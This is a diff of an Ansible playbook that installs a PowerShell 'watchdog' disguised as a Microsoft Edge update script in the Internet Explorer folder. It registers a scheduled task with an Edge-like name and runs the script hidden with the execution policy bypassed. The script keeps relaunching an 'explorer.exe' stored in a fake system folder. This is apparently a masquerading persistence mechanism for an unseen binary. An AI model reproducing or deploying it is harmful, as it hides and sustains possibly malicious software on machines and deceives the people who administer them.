@@ -23,24 +23,55 @@
   ansible.windows.win_copy:
     dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
     content: |
-      $exePath = 'C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe'
-      $processName = 'explorer'
+      $exePath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\explorer.exe'
+      $logPath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\Testing.log'
+
+      function Write-Log {
+          param([string]$Message)
+          $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+          Add-Content -Path $logPath -Value "$ts - $Message"
+      }
+
+      Write-Log "Watchdog started."
 
       if (-not (Test-Path $exePath)) {
+          Write-Log "ERROR: EXE not found."
           exit 1
       }
 
-      $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
+      $running = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
 
-      if (-not $running) {
-          Start-Process -FilePath $exePath -WindowStyle Hidden
+      if ($running) {
+          Write-Log "Process already running."
+          exit 0
+      }
+
+      try {
+          Write-Log "Process not running. Starting it now."
+          Start-Process -FilePath $exePath
+          Start-Sleep -Seconds 5
+
+          $runningAfter = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
+
+          if ($runningAfter) {
+              Write-Log "Process started successfully."
+              exit 0
+          }
+          else {
+              Write-Log "ERROR: Start attempted but process not found afterward."
+              exit 2
+          }
+      }
+      catch {
+          Write-Log "ERROR: $($_.Exception.Message)"
+          exit 3
       }
 
 - name: Create scheduled task for watchdog
   ansible.windows.win_powershell:
     script: |
       $taskName   = 'MicrosoftEdgeUpdateTaskMachineEN'
-      $scriptPath = 'C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1'
+      $scriptPath = 'C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1'
 
       $action = New-ScheduledTaskAction `
         -Execute 'powershell.exe' `
@@ -83,4 +114,4 @@
 - name: Run watchdog once immediately
   ansible.windows.win_powershell:
     script: |
-      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1"
